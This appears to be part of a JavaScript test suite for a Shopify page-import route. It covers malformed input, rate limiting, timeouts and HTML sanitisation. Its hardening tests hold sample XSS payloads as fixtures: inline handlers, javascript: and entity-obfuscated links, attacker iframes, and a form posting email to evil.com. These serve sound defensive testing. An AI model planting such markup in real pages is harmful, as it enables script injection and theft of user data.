  const okv = await call('/stub/list');
  eq(okv.status, 200, 'api-version: a well-formed YYYY-MM version is used');
  ok(seen.includes('/admin/api/2025-07/'), 'api-version: …verbatim in the path', seen);
  if (prev === undefined) delete process.env.SHOPIFY_API_VERSION;
  else process.env.SHOPIFY_API_VERSION = prev;
}

// ---- IMPORT: MALFORMED / OVERSIZED SOURCE ---------------------------------
{
  bumpUser();
  // A 200 with no page object is a FAILED call, not an empty page.
  for (const [label, payload] of [
    ['no page key', { }], ['page: null', { page: null }], ['page: a string', { page: 'nope' }],
  ]) {
    fetchImpl = routeFetch({ page: () => jsonResponse(payload) });
    const r = await call('/stub/import', { page_id: '7' });
    eq(r.status, 503, `malformed: a 200 with ${label} → 503, never a blank clone`);
    eq(r.body?.error?.code, 'shopify_unavailable', `malformed: ${label} → shopify_unavailable`);
  }
  // A non-string body_html is not content.
  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 7, title: 'T', handle: 't', body_html: { nope: 1 } } }) });
  const weird = await call('/stub/import', { page_id: '7' });
  eq(weird.status, 422, 'malformed: a non-string body_html → 422 theme_built, no throw');

  // Unbalanced / hostile markup must not throw — the splitter is total.
  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 7, title: 'T', handle: 't', body_html: `<div><p>${COPY}<div><span>` } }) });
  const ragged = await call('/stub/import', { page_id: '7' });
  eq(ragged.status, 200, 'malformed: unbalanced markup still scans, never 500');

  // Raw source over the 10MB scan limit → 413, at the SAME threshold as /scan.
  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 7, title: 'T', handle: 't', body_html: `<p>${COPY}</p>` + 'x'.repeat(INPUT_MAX) } }) });
  const huge = await call('/stub/import', { page_id: '7' });
  eq(huge.status, 413, 'oversized: raw body_html over 10MB → 413');
  eq(huge.body?.error?.code, 'source_too_large', 'oversized: with code source_too_large');

  // Cleaned output over the 2MB page cap → 413, same threshold as /scan.
  const chunk = `<section>${'y'.repeat(800 * 1024)}</section>`;
  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 7, title: 'T', handle: 't', body_html: chunk + chunk + chunk } }) });
  const fat = await call('/stub/import', { page_id: '7' });
  eq(fat.status, 413, 'oversized: cleaned output over 2MB → 413');
  eq(fat.body?.error?.code, 'cleaned_too_large', 'oversized: with code cleaned_too_large');
  ok(ESCAPE_HATCH_MAX === 2 * 1024 * 1024 && INPUT_MAX === 10 * 1024 * 1024, 'oversized: the caps are pageClone.js\'s own, not a second copy');
}

// ---- IMPORT FAILURE PATHS -------------------------------------------------
{
  bumpUser();
  const cases = [
    ['timeout', async () => { const e = new Error('aborted'); e.name = 'AbortError'; throw e; }, 'shopify_unavailable', true],
    ['HTTP 404 (deleted page)', () => jsonResponse({}, 404), 'page_not_found', false],
    ['HTTP 500', () => jsonResponse({}, 500), 'shopify_unavailable', true],
    ['HTTP 401', () => jsonResponse({}, 401), 'shopify_auth_error', false],
  ];
  for (const [label, impl, code, retryable] of cases) {
    fetchImpl = routeFetch({ page: impl });
    const r = await call('/stub/import', { page_id: '7' });
    eq(r.status, code === 'page_not_found' ? 404 : 503, `import-fail: ${label} → ${code === 'page_not_found' ? 404 : 503}`);
    eq(r.body?.error?.code, code, `import-fail: ${label} → ${code}`);
    eq(r.body?.error?.retryable, retryable, `import-fail: ${label} → retryable ${retryable}`);
    ok(!Array.isArray(r.body?.data?.sections), `import-fail: ${label} returns no sections array`);
  }
}

// ---- MALFORMED REQUEST BODY -----------------------------------------------
{
  bumpUser();
  fetchImpl = async () => { throw new Error('must not reach Shopify on a malformed body'); };
  const r = await realFetch(`${base}/stub/import`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: '{nope',
  });
  ok(r.status >= 400 && r.status < 500, 'body: malformed JSON → 4xx, server alive', `got ${r.status}`);
  const none = await realFetch(`${base}/stub/import`, { method: 'POST' });
  ok(none.status >= 400 && none.status < 500, 'body: no body at all → 4xx, no crash', `got ${none.status}`);
  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 7, title: 'T', handle: 't', body_html: `<p>${COPY}</p>` } }) });
  const alive = await call('/stub/import', { page_id: '7' });
  eq(alive.status, 200, 'body: the route still answers after bad bodies');
}

// ---- RATE LIMIT -----------------------------------------------------------
{
  bumpUser();
  eq(PAGES_RATE_MAX, 30, 'rate: the cap is 30 requests');
  eq(PAGES_RATE_WINDOW_SEC, 60, 'rate: per 60 seconds');
  // The bound that matters is on EVERY outbound Admin call, not just the one
  // the pages mock happens to see: counting only /pages.json measured a bound
  // it did not enforce, and missed the /shop.json call entirely.
  seenUrls = [];
  fetchImpl = routeFetch({ pages: () => jsonResponse({ pages: [] }) });
  let limited = null;
  for (let i = 0; i < PAGES_RATE_MAX + 6; i += 1) {
    const r = await call('/stub/list');
    if (r.status === 429) { limited = r; break; }
  }
  const adminCalls = seenUrls.length;
  const pagesCalls = seenUrls.filter((u) => u.includes('pages.json')).length;
  const shopCalls = seenUrls.filter((u) => u.includes('shop.json')).length;
  ok(limited !== null, 'rate: hammering the picker eventually returns 429');
  if (limited) {
    eq(limited.body?.error?.code, 'rate_limited', 'rate: with code rate_limited');
    eq(limited.body?.error?.retryable, true, 'rate: a throttle clears on its own, so it IS flagged retryable');
    ok(!Array.isArray(limited.body?.data?.pages), 'rate: a 429 returns no pages array — it is not an empty store');
    ok(adminCalls <= PAGES_RATE_MAX + 1,
      'rate: EVERY outbound Admin call is under the cap (+1 for the one memoised shop.json) — the shared bucket is protected',
      `total=${adminCalls} pages=${pagesCalls} shop=${shopCalls}`);
    eq(shopCalls, 1, 'rate: the storefront lookup happened ONCE across the whole burst, not once per request');
  }
  // The import shares the same per-user bucket.
  const r = await call('/stub/import', { page_id: '7' });
  eq(r.status, 429, 'rate: import shares the bucket once list has exhausted it');
}

// ---- THE 8s TIMEOUT IS ACTUALLY ARMED -------------------------------------
{
  bumpUser();
  eq(FETCH_TIMEOUT_MS, 8000, 'timeout: the budget is 8s, same as the variant search');
  let sawSignal = false;
  let aborted = false;
  fetchImpl = async (_url, opts) => {
    sawSignal = Boolean(opts.signal);
    return new Promise((_resolve, reject) => {
      opts.signal.addEventListener('abort', () => {
        aborted = true;
        const e = new Error('aborted');
        e.name = 'AbortError';
        reject(e);
      });
      // Force the abort immediately rather than waiting 8 real seconds.
      setTimeout(() => opts.signal.dispatchEvent(new Event('abort')), 5);
    });
  };
  const r = await call('/stub/list');
  ok(sawSignal, 'timeout: an AbortSignal is passed to fetch');
  ok(aborted, 'timeout: the abort path fires');
  eq(r.status, 503, 'timeout: an aborted request answers 503, never a hang or a 200');
}

// ---- B1: THE LIST MUST NOT BLOCK THE EVENT LOOP ---------------------------
// This route shares a process with public checkout and /f. Deriving from FULL
// body_html was measured at 1,945 ms of synchronous block and +183 MB heap for
// 500 rows x ~292 KB — a checkout outage caused by a page picker.
{
  bumpUser();
  ok(LIST_NODE_MAX * BODY_PROBE_BYTES <= LIST_BODY_BUDGET_BYTES,
    `budget: LIST_NODE_MAX x BODY_PROBE_BYTES (${LIST_NODE_MAX * BODY_PROBE_BYTES}) is bounded by LIST_BODY_BUDGET_BYTES (${LIST_BODY_BUDGET_BYTES})`);

  const fatBody = `<p>${'word '.repeat(60_000)}</p>`; // ~292 KB, as measured
  ok(fatBody.length > BODY_PROBE_BYTES * 10, 'budget: the fixture body is many times the probe window', String(fatBody.length));
  const fatRows = Array.from({ length: LIST_NODE_MAX }, (_, i) => ({
    id: i + 1, title: `P${i}`, handle: `p${i}`, body_html: fatBody,
  }));

  const t0 = process.hrtime.bigint();
  const mapped = mapPageRows(fatRows, 'https://s.com');
  const ms = Number(process.hrtime.bigint() - t0) / 1e6;
  eq(mapped.length, LIST_NODE_MAX, 'budget: every row is still mapped — the cap bounds WORK, it does not drop rows');
  ok(ms < 400, `budget: ${LIST_NODE_MAX} x ${Math.round(fatBody.length / 1024)}KB rows map in ${ms.toFixed(0)}ms (<400ms) — was 1,945ms on full bodies`, `${ms.toFixed(0)}ms`);

  // The slice is real: text beyond the probe window is never examined, so a
  // marker past it cannot appear in the summary.
  const marker = 'UNIQUEMARKERPASTTHEWINDOW';
  const past = `<p>${'a '.repeat(BODY_PROBE_BYTES)}${marker}</p>`;
  const [row] = mapPageRows([{ id: 1, handle: 'h', body_html: past }], 'https://s.com');
  ok(!row.summary.includes(marker), 'slice: content past the probe window is never read', row.summary.slice(-40));
  eq(row.summary.length, SUMMARY_MAX, 'slice: the summary is still full-length from the probe alone');
  eq(deriveRowText(past).probed, BODY_PROBE_BYTES, 'slice: exactly BODY_PROBE_BYTES characters are examined');
  eq(deriveRowText('<p>hi</p>').probed, 9, 'slice: a short body is examined whole, not padded');
  eq(deriveRowText(null).text, '', 'slice: a null body derives nothing and does not throw');
  eq(deriveRowText({ nope: 1 }).text, '', 'slice: a non-string body derives nothing and does not throw');

  // And the same body arriving over HTTP does not blow the response up either.
  fetchImpl = routeFetch({ pages: () => jsonResponse({ pages: fatRows.slice(0, 50) }) });
  const r = await call('/stub/list');
  eq(r.status, 200, 'budget: a store of fat pages still lists');
  const wire = JSON.stringify(r.body).length;
  ok(wire < 50 * (SUMMARY_MAX + 400),
    `budget: 50 fat pages serialise to ${wire}B — bounded by the summary cap, not by body_html (${50 * fatBody.length}B of source)`, String(wire));
  ok(r.body.data.pages.every((p) => p.summary.length <= SUMMARY_MAX), 'budget: every summary respects the cap');
}

// ---- M3: A FRAGMENT IS NOT A DOCUMENT ------------------------------------
// body_html is whatever an operator typed into Shopify's page editor. Fed to
// the splitter's whole-document heuristics, one stray </body> scoped the split
// to everything before it and silently dropped the rest (measured: 76.6% lost,
// answered 200, reported nothing).
{
  bumpUser();
  const strip = stripDocumentWrappers('<!doctype html><html><head><title>x</title></head><body><p>keep</p></body></html>');
  ok(!/<html|<\/html|<body|<\/body|<head|doctype/i.test(strip.html), 'wrappers: html/head/body/doctype all come off', strip.html);
  ok(strip.html.includes('<p>keep</p>'), 'wrappers: the content survives', strip.html);
  ok(strip.bytesStripped > 0, 'wrappers: the dropped byte count is reported, never silent');
  eq(stripDocumentWrappers('<p>clean</p>').bytesStripped, 0, 'wrappers: a clean fragment loses nothing');
  ok(stripDocumentWrappers('<main><p>x</p></main>').html.includes('<main>'), 'wrappers: <main> is KEPT — fragment mode stops it scoping, so the element stays');
  eq(stripDocumentWrappers(null).html, '', 'wrappers: null → "", no throw');

  const tail = `<section>TAILMARKER ${COPY}</section>`;
  const cases = [
    ['a stray </body> mid-content', `<section>HEADMARKER ${COPY}</section></body>${tail}`],
    ['a full <html> skeleton', `<html><body><section>HEADMARKER ${COPY}</section>${tail}</body></html>`],
    ['a <main> wrapper with content after it', `<main><section>HEADMARKER ${COPY}</section></main>${tail}`],
    ['a doctype pasted into the editor', `<!doctype html><section>HEADMARKER ${COPY}</section>${tail}`],
  ];
  for (const [label, body] of cases) {
    fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 4, title: 'Frag', handle: 'frag', body_html: body } }) });
    const r = await call('/stub/import', { page_id: '4' });
    const all = (r.body?.data?.sections || []).map((s) => s.html).join('\n');
    eq(r.status, 200, `fragment: ${label} → 200`);
    ok(all.includes('HEADMARKER'), `fragment: ${label} keeps the content BEFORE the wrapper`);
    ok(all.includes('TAILMARKER'), `fragment: ${label} keeps the content AFTER it — nothing is silently dropped`, all.slice(0, 160));
  }
  // The byte count rides back on the scan whenever wrappers came off.
  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 4, title: 'F', handle: 'f', body_html: `<body><section>${COPY}</section></body>` } }) });
  const withWrappers = await call('/stub/import', { page_id: '4' });
  ok(withWrappers.body?.data?.stats?.wrapper_bytes_stripped > 0, 'fragment: stripped wrapper bytes are REPORTED in stats', JSON.stringify(withWrappers.body?.data?.stats));
  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 4, title: 'F', handle: 'f', body_html: `<section>${COPY}</section>` } }) });
  const clean = await call('/stub/import', { page_id: '4' });
  ok(!('wrapper_bytes_stripped' in (clean.body?.data?.stats || {})), 'fragment: a clean body reports no wrapper strip at all');
}

// ---- M4: ACTIVE-CONTENT HARDENING (SHARED CLEANER, BOTH PATHS) -----------
// A cloned page is third-party markup re-served from OUR origin under our
// session cookies. <script> was already dropped; inline handlers, javascript:
// URLs, arbitrary iframes and off-site form posts were not.
{
  bumpUser();
  eq(urlScheme('javascript:alert(1)'), 'javascript', 'scheme: plain javascript:');
  eq(urlScheme('JaVaScRiPt:x'), 'javascript', 'scheme: case is irrelevant');
  eq(urlScheme('java\tscript:x'), 'javascript', 'scheme: an embedded tab does not hide it');
  eq(urlScheme('&#106;avascript:x'), 'javascript', 'scheme: a numeric entity does not hide it');
  eq(urlScheme('javascript&colon;x'), 'javascript', 'scheme: &colon; does not hide it');
  eq(urlScheme('  vbscript:x'), 'vbscript', 'scheme: leading space does not hide it');
  eq(urlScheme('/relative/path'), '', 'scheme: a relative path has none');
  eq(urlScheme('https://ok'), 'https', 'scheme: an ordinary URL is read normally');
  eq(urlScheme(null), '', 'scheme: null → "", no throw');

  eq(isAllowedEmbedHost('www.youtube.com'), true, 'embed: a youtube subdomain is allowed');
  eq(isAllowedEmbedHost('fast.wistia.net'), true, 'embed: fast.wistia.net is allowed');
  eq(isAllowedEmbedHost('evil-youtube.com'), false, 'embed: a look-alike suffix is REFUSED');
  eq(isAllowedEmbedHost('youtube.com.evil.com'), false, 'embed: a prefixed look-alike is REFUSED');
  eq(isAllowedEmbedHost(''), false, 'embed: no host → refused');
  ok(IFRAME_EMBED_HOSTS.length > 0 && IFRAME_EMBED_HOSTS.every((h) => typeof h === 'string'), 'embed: the allowlist is an exported const');

  const hostile = `<section>
    <div onclick="steal()" onmouseover='track()'>${COPY}</div>
    <a href="javascript:alert(1)">go</a>
    <a href="&#106;avascript:alert(2)">go2</a>
    <a href="vbscript:msgbox">go3</a>
    <a href="/legit">legit</a>
    <iframe src="https://www.youtube.com/embed/abc"></iframe>
    <iframe src="https://fast.wistia.net/embed/x"></iframe>
    <iframe src="https://evil.com/frame"></iframe>
    <iframe src="https://evil-youtube.com/frame"></iframe>
    <iframe></iframe>
    <form action="https://evil.com/collect" method="post"><input name="email"></form>
    <form action="/local"><input name="q"></form>
  </section>`;
  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 6, title: 'H', handle: 'h', body_html: hostile } }) });
  const r = await call('/stub/import', { page_id: '6' });
  const all = (r.body?.data?.sections || []).map((s) => s.html).join('\n');
  const st = r.body?.data?.stats || {};
  eq(r.status, 200, 'harden: the page still imports — hardening is not refusal');

  ok(!/\son[a-z]+\s*=/i.test(all), 'harden: no inline event handler survives', all.match(/\son[a-z]+\s*=[^\s>]*/i)?.[0]);
  eq(st.handlers_stripped, 2, 'harden: both handlers are COUNTED');
  ok(!/javascript\s*:|vbscript\s*:/i.test(all.replace(/data-original-action="[^"]*"/g, '')), 'harden: no executing URL scheme survives');
  eq(st.unsafe_urls_stripped, 3, 'harden: all three executing links are counted (entity-obfuscated one included)');
  ok(all.includes('href="https://shop.example.com/legit"'), 'harden: an ordinary link survives (absolutized, not stripped)', all.match(/href="[^"]*legit[^"]*"/)?.[0]);

  ok(all.includes('youtube.com/embed/abc'), 'harden: an allowlisted YouTube embed is KEPT');
  ok(all.includes('fast.wistia.net/embed/x'), 'harden: an allowlisted Wistia embed is KEPT');
  ok(!all.includes('evil.com/frame'), 'harden: an off-allowlist iframe is removed');
  ok(!all.includes('evil-youtube'), 'harden: a look-alike host does not sneak past the allowlist');
  eq(st.iframes_removed, 3, 'harden: evil + look-alike + srcless iframes are counted');

  ok(!/\saction\s*=\s*["']?https:\/\/evil\.com/i.test(all),
    'harden: the off-site form action is gone (anchored on an attribute boundary — data-original-action must not satisfy this)',
    all.match(/[a-z-]*action\s*=\s*"[^"]*"/gi)?.join(' | '));
  ok(all.includes('data-original-action="https://evil.com/collect"'), 'harden: …but preserved inertly so the operator can see where it pointed');
  ok(all.includes('<form action="/local">'), 'harden: a same-origin form action is untouched');
  ok(all.includes('name="email"'), 'harden: the form itself SURVIVES — layout the operator cloned on purpose');
  eq(st.forms_neutralized, 1, 'harden: only the off-site form is counted');

  // Every count is present (as 0) on a clean page, so the UI never has to
  // distinguish "not scanned" from "nothing found".
  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 6, title: 'C', handle: 'c', body_html: `<section>${COPY}</section>` } }) });
  const cleanRun = await call('/stub/import', { page_id: '6' });
  const cs = cleanRun.body?.data?.stats || {};
  eq(
    [cs.handlers_stripped, cs.unsafe_urls_stripped, cs.iframes_removed, cs.forms_neutralized],
    [0, 0, 0, 0],
    'harden: a clean page reports every counter as 0, not undefined'
  );
}

// ---- m1: `fields` RIDES EVERY CURSOR HOP ---------------------------------
{
  bumpUser();
  let hop = 0;
  seenUrls = [];
  fetchImpl = routeFetch({
    pages: () => {
      hop += 1;
      return jsonResponse(
        { pages: [{ id: String(hop), title: `P${hop}`, handle: `p${hop}`, body_html: `<p>${COPY}</p>` }] },
        200,
        { Link: `<https://x/admin/api/2024-01/pages.json?page_info=CUR${hop}>; rel="next"` }
      );
    },
  });
  await call('/stub/list');
  const pageCalls = seenUrls.filter((u) => u.includes('pages.json'));
  eq(pageCalls.length, LIST_HOP_MAX, 'fields: every hop was made');
  ok(pageCalls.every((u) => u.includes('fields=')), 'fields: EVERY hop carries fields= — hops 2..N no longer pull whole page objects', JSON.stringify(pageCalls));
  ok(pageCalls.slice(1).every((u) => u.includes('page_info=')), 'fields: …alongside the cursor');
  // NOTE: Shopify documents page_info as combinable with limit and fields.
  // That cannot be verified against the live store from here (no credentials
  // in this environment) — this asserts the shape of OUR request only, and a
  // live rejection would surface as shopify_rejected with the status logged.
}

// ---- REDIRECTS ARE NOT FOLLOWED -------------------------------------------
{
  bumpUser();
  let sawRedirect = null;
  fetchImpl = routeFetch({ pages: (_u, opts) => { sawRedirect = opts.redirect; return jsonResponse({ pages: [] }); } });
  await call('/stub/list');
  eq(sawRedirect, 'error', 'redirect: the token-bearing request never follows a redirect to another host');
}

server.close();
globalThis.fetch = realFetch;
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
